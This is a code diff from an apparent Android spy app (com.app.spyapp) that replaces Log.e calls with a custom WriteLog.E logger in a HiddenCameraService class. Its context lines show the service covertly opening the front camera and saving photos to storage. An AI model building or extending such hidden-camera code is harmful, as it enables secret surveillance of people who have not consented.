@@ -8,12 +8,12 @@ import android.hardware.Camera;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
-import android.util.Log;
 import android.view.SurfaceView;
 import android.widget.Toast;
 
 import com.app.spyapp.R;
 import com.app.spyapp.common.Utils;
+import com.app.spyapp.common.WriteLog;
 
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -139,10 +139,10 @@ public class HiddenCameraService extends Service {
 
     Camera.PictureCallback mCall = new Camera.PictureCallback() {
         public void onPictureTaken(byte[] data, Camera camera) {
-            Log.e(TAG, "callback onpitcturetaken");
+            WriteLog.E(TAG, "callback onpitcturetaken");
             File pictureFile = getOutputMediaFile(MEDIA_TYPE_IMAGE);
             if (pictureFile == null) {
-                Log.e(TAG, "Error creating media file, check storage permissions: ");
+                WriteLog.E(TAG, "Error creating media file, check storage permissions: ");
                 return;
             }
 
@@ -152,9 +152,9 @@ public class HiddenCameraService extends Service {
                 fos.close();
                 safeToTakePicture = true;
             } catch (FileNotFoundException e) {
-                Log.e(TAG, "File not found: " + e.getMessage());
+                WriteLog.E(TAG, "File not found: " + e.getMessage());
             } catch (IOException e) {
-                Log.e(TAG, "Error accessing file: " + e.getMessage());
+                WriteLog.E(TAG, "Error accessing file: " + e.getMessage());
             }
         }
     };
@@ -167,7 +167,7 @@ public class HiddenCameraService extends Service {
 
         if (!mediaStorageDir.exists()) {
             if (!mediaStorageDir.mkdirs()) {
-                Log.e(TAG, "failed to create directory");
+                WriteLog.E(TAG, "failed to create directory");
                 return null;
             }
         }
@@ -203,7 +203,7 @@ public class HiddenCameraService extends Service {
 //            catch(OutOfMemoryError oom) {
 //                Log.e(TAG, "-- OOM Error in setting image");
 //            }
-            Log.e(TAG, "mediafile path" + mediaFile);
+            WriteLog.E(TAG, "mediafile path" + mediaFile);
 
         } else {
             return null;
@@ -218,7 +218,7 @@ public class HiddenCameraService extends Service {
             Camera.CameraInfo info = new Camera.CameraInfo();
             Camera.getCameraInfo(i, info);
             if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
-                Log.e(TAG, "front Camera found");
+                WriteLog.E(TAG, "front Camera found");
                 cameraId = i;
                 break;
             }
@@ -237,7 +237,7 @@ public class HiddenCameraService extends Service {
             camera = Camera.open(id);
             qOpened = (camera != null);
         } catch (Exception e) {
-            Log.e(getString(R.string.app_name), "failed to open Camera");
+            WriteLog.E(getString(R.string.app_name), "failed to open Camera");
 
         }
         return qOpened;
